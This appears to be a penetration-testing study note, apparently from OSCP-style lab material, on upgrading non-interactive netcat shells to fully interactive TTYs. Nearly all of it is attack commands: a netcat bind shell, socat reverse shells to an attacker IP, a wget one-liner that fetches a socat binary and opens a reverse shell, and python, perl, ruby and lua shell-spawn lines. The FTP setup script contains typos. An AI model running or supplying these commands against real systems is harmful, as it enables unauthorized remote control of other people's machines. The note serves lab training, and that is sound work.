
Most **nc**-like tools provide a non-interactive shell.  
• Any programs that require user input (like file transfers or **su** & **sudo** work poorly if at all)  
• Lack usefull features, like tab completion & job control  
  
  
It's important to know how to upgrade to a full TTY  
  
Check for [fully interactive TTY](Fully%20Interactive%20TTY.md):
	Should see:
```bash
tty
	/dev/pts/0
```

Python comes w/ a standard module named _pty_ allowing for creation of pseudo-terminals  

Demo Setup:  
	Install an FTP server & configure:  
```bash
sudo apt update && sudo apt install pure-ftpd
```
  
Create a new user for Pure-FTPd script & run  
```bash
#!/bin/bash  
  
sudo groupadd ftpgroup  
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
sudo pure-pw useradd offsec -u ftpuser -d /ftphome  
sudo pure-pw mkdb  
cd /etc/pure-tfpd/auth/  
sudo ln -s ../conf/PureDB 60pdb  
sudo mkdir - /ftphome  
sudo chown -R ftpuser:ftpgroup /ftphome/  
sudo systemctl restart pure-ftpd
```

Demo:    
Assuming we compromised the Debian lab client and obtained access to a **nc** bind shell:  
```bash
student@debian:~$  nc -lnvp 4444 -e /bin/bash
```

```bash
kali@kali:~$  nc -vn 10.11.0.128 4444  
ftp 10.11.0.4  
offsec  
lab  
bye  
  
^C  
kali@kali:~$
``` 

We were to attempt to login from the Debian lab client --> Kali (running FTPd), however, as it's a non-interactive shell, we don't receive any feedback.  
  

### Upgrading to Interactive Shell:
**[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)  

Python:  
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```


Socat:  
```bash
#Listener/ Attacker:  
socat file:`tty`,raw,echo=0 tcp-listen:4444  
  
#Victim:  
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

*If not installed on victim:  
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```


Using stty options:  
```bash
# In reverse shell  
$ python -c 'import pty; pty.spawn("/bin/bash")'  
Ctrl-Z  
echo $TERM  
stty -a #Get rows/ columns info  
  
# In Kali  
$ stty raw -echo  
$ fg  
  
# In reverse shell  
$ reset  
$ export SHELL=bash  
$ export TERM=xterm-256color  
$ stty rows <num> columns <cols>
```


Others:  
```bash
echo os.system('/bin/bash')  
/bin/sh -i  
  
#python3  
python3 -c 'import pty; pty.spawn("/bin/sh")'  
  
#perl  
perl -e 'exec "/bin/sh";'  
  
#ruby  
exec "/bin/sh"  
ruby -e 'exec "/bin/sh"'  
  
#lua  
lua -e "os.execute('/bin/sh')"
```